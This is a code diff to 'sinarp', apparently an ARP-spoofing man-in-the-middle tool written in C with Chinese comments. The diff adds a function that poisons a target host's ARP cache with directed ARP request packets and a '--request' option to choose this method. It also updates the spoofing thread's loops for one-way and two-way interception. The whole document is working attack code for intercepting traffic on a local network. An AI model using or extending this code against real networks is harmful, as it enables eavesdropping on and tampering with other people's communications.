@@ -26,11 +26,12 @@ Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110 - 1301, USA.
 
 
 //----------  global var
-char *g_sinarp_version = "sinarp V2.1";
+char *g_sinarp_version = "sinarp V2.2";
 pcap_t *g_adhandle = NULL;  // 网卡句柄
 char g_opened_if_name[256] = {0};//打卡的网卡名称 因为有时候插件需要知道 打开的是哪块网卡 。。所以要把这个导出
 uint32 g_interval = 3000;//3 s 欺骗一次
 spoof_type g_spoof_type = SPOOF_AB; //默认是双向欺骗
+spoof_method g_spoof_method = SPOOF_METHOD_REPLAY; //默认的欺骗方式使用使用 ARP_REPLAY
 Host  g_HostList[256]; //注意要全部初始化为 0
 uint32 g_my_ip = 0;  // 自己的 ip 也就是中间人的 ip
 uint8  g_my_mac[6] = {0}; //自己的 mac 也就是中间人的 mac
@@ -410,6 +411,25 @@ BOOL  sinarp_arp_spoof(uint32 spoof_ip, uint8 *spoof_mac, uint32 ip, uint8 *mac)
     return TRUE;
 }
 
+
+/*
+告诉 spoof_ip ip 对应的 MAC 是 mac
+*/
+BOOL  sinarp_arp_spoof_use_request(uint32 spoof_ip, uint8 *spoof_mac, uint32 ip, uint8 *mac)
+{
+    ARP_PACKET arp_packet;
+    memset(&arp_packet, 0, sizeof(arp_packet));
+    //定向发送 request 包
+    sinarp_build_arp_packet(&arp_packet, ARP_REQUEST, mac, spoof_mac, mac, ip, g_zero_mac, spoof_ip);
+    if (pf_pcap_sendpacket(g_adhandle, (unsigned char *)&arp_packet, ARP_LEN) < 0)
+    {
+        sinarp_printf("%s", "[!]sinarp_arp_spoof(): send packet error\n");
+        return FALSE;
+    }
+    return TRUE;
+}
+
+
 #ifdef WIN32
 BOOL sinarp_init_pcap_funcs()
 {
@@ -494,7 +514,8 @@ void sinarp_show_help_msg()
                   "\t-p [Name of the plug-ins to be loaded, split multiple plugin use ',']\n"
                   "\t-t [Time between echo spoof packet , in ms, default is 10000ms]\n"
                   "\t-f [Close ip forwarding]\n"
-                  "\t--mac [ip1-mac1,ip2-mac2] special the mac of the ip \n");
+                  "\t--mac [ip1-mac1,ip2-mac2] special the mac of the ip \n"
+                  "\t--request [arp spoof use arp request]\n");
 }
 /*
 void sinarp_show_help_msg()
@@ -1478,7 +1499,17 @@ void *sinarp_spoof_thread(void *lparam)
                         //单向欺骗的时候不检查 B  是不是存活的
                         if (g_HostList[j].type == HOST_B )//&& g_HostList[j].active == 1)
                         {
-                            sinarp_arp_spoof(g_HostList[i].ip, g_HostList[i].mac, g_HostList[j].ip, g_my_mac);
+                            switch (g_spoof_method)
+                            {
+                            case SPOOF_METHOD_REPLAY:
+                                sinarp_arp_spoof(g_HostList[i].ip, g_HostList[i].mac, g_HostList[j].ip, g_my_mac);
+                                break;
+                            case SPOOF_METHOD_REQUEST:
+                                sinarp_arp_spoof_use_request(g_HostList[i].ip, g_HostList[i].mac, g_HostList[j].ip, g_my_mac);
+                                break;
+                            default:
+                                break;
+                            }
                         }
                     }
                 }
@@ -1497,7 +1528,17 @@ void *sinarp_spoof_thread(void *lparam)
                     {
                         if (g_HostList[j].type == HOST_B && g_HostList[j].active == 1)
                         {
-                            sinarp_arp_spoof(g_HostList[i].ip, g_HostList[i].mac, g_HostList[j].ip, g_my_mac);
+                            switch (g_spoof_method)
+                            {
+                            case SPOOF_METHOD_REPLAY:
+                                sinarp_arp_spoof(g_HostList[i].ip, g_HostList[i].mac, g_HostList[j].ip, g_my_mac);
+                                break;
+                            case SPOOF_METHOD_REQUEST:
+                                sinarp_arp_spoof_use_request(g_HostList[i].ip, g_HostList[i].mac, g_HostList[j].ip, g_my_mac);
+                                break;
+                            default:
+                                break;
+                            }
                         }
                     }
                 }
@@ -1511,7 +1552,17 @@ void *sinarp_spoof_thread(void *lparam)
                     {
                         if (g_HostList[j].type == HOST_A && g_HostList[j].active == 1)
                         {
-                            sinarp_arp_spoof(g_HostList[i].ip, g_HostList[i].mac, g_HostList[j].ip, g_my_mac);
+                            switch (g_spoof_method)
+                            {
+                            case SPOOF_METHOD_REPLAY:
+                                sinarp_arp_spoof(g_HostList[i].ip, g_HostList[i].mac, g_HostList[j].ip, g_my_mac);
+                                break;
+                            case SPOOF_METHOD_REQUEST:
+                                sinarp_arp_spoof_use_request(g_HostList[i].ip, g_HostList[i].mac, g_HostList[j].ip, g_my_mac);
+                                break;
+                            default:
+                                break;
+                            }
                         }
                     }
                 }
@@ -2081,6 +2132,10 @@ int  main(int argc , char **argv)
         else if (stricmp(argv[idx - 1], "--mac") == 0)
         {
             mac_string = argv[idx];
+        }
+        else if (stricmp(argv[idx - 1], "--request") == 0)
+        {
+            g_spoof_method = SPOOF_METHOD_REQUEST;
         }
     }
     //
